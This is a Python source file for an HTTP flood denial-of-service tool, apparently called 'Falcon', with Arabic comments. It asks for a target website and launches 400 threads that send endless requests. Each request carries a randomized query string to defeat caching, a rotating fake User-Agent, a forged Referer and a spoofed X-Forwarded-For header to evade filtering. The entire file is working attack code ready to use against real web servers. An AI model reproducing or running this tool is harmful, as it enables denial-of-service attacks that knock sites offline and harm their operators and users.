import urllib.request
import concurrent.futures
import random
import re
import sys
import os
from colorama import Fore
from threading import Thread, Lock
from halo import Halo
from faker import Faker
from fake_useragent import UserAgent
from logo import logo

# -------------------------
# تعريف المتغيرات العالمية
lock = Lock()
fake = Faker()
ua = UserAgent()

url = ''
host = ''
request_counter = 0
flag = 0
safe = False

# معلومات الأداة
__version__ = '8.0 BETA'
__author__ = "Al-Mohammady Team"
__method__ = 'HTTP V2 BETA'

# -------------------------
# تعريف الدوال

def inc_counter():
    """زيادة عداد الطلبات بطريقة آمنة للخيوط."""
    global request_counter
    with lock:
        request_counter += 1

def set_flag(val):
    """تعيين قيمة العلم."""
    global flag
    flag = val

def set_safe():
    """تعيين الوضع الآمن."""
    global safe
    safe = True

def buildblock(size):
    out_str = ''
    for _ in range(0, size):
        a = random.randint(65, 90)
        out_str += chr(a)
        
    return(out_str)

def usage():
    """عرض معلومات الاستخدام."""
    spinner = Halo()
    spinner.succeed(f'Method: {__method__}')
    spinner.stop()
    print('-' * 40)

def httpcall(url):
    """إرسال طلب HTTP."""
    payload = f"{buildblock(random.randint(3, 10))}={buildblock(random.randint(3, 10))}"
    request_url = f"{url}?{payload}" if '?' not in url else f"{url}&{payload}"
    headers = {
        "User-Agent": ua.random,
        "X-Requested-With": "XMLHttpRequest",
        "Pragma": "no-cache",
        "Cache-Control": "no-cache",
        "Accept": "*/*",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9",
        "Referer": random.choice(["https://www.google.com", "https://www.bing.com", "https://www.yahoo.com"]) + f"/?q={buildblock(random.randint(3, 15))}",
        "DNT": "1",
        "Connection": "keep-alive",
        "X-Forwarded-For": fake.ipv4(),
    }

    try:
        req = urllib.request.Request(request_url, headers=headers)
        urllib.request.urlopen(req)
        inc_counter()
    except urllib.error.HTTPError as e:
        set_flag(1)
        print(f"{Fore.RED}[ {e.code} ] {Fore.MAGENTA}Response Code!")
    except Exception:
        pass  # تجاهل الأخطاء الأخرى

def monitor_requests():
    """مراقبة الطلبات المرسلة."""
    sent = 0
    previous = 0
    while flag == 0:
        with lock:
            if request_counter >= previous + 100:
                sent += 1
                print(f"{Fore.YELLOW}[ {sent} ] {Fore.GREEN}Request Sent! Total: {request_counter}.")
                previous = request_counter
    if flag == 2:
        print(f"{Fore.RED}-- Falcon Attack Finished --{Fore.RESET}")

def attack(url):
    """تنفيذ الهجوم."""
    while flag < 2:
        httpcall(url)

# -------------------------
# البرنامج الرئيسي
if __name__ == "__main__":
    os.system('clear')
    logo()
    usage()

    url = input(f"{Fore.YELLOW}[ ? ]{Fore.GREEN} Website Target: ").strip()
    if url.count("/") == 2:
        url += "/"

    host = re.search(r'(https?://)?([^/]*)/?.*', url).group(2)

    safe_option = input(f"{Fore.YELLOW}[ ? ] {Fore.GREEN}Enable Safe Mode (yes/no): ").strip().lower()
    if safe_option == "yes":
        set_safe()

    monitor_thread = Thread(target=monitor_requests, daemon=True)
    monitor_thread.start()

    with concurrent.futures.ThreadPoolExecutor(max_workers=400) as executor:
        try:
            futures = [executor.submit(attack, url) for _ in range(400)]
            concurrent.futures.wait(futures)
        except KeyboardInterrupt:
            set_flag(2)
            print(f"{Fore.RED}Attack interrupted by user.{Fore.RESET}")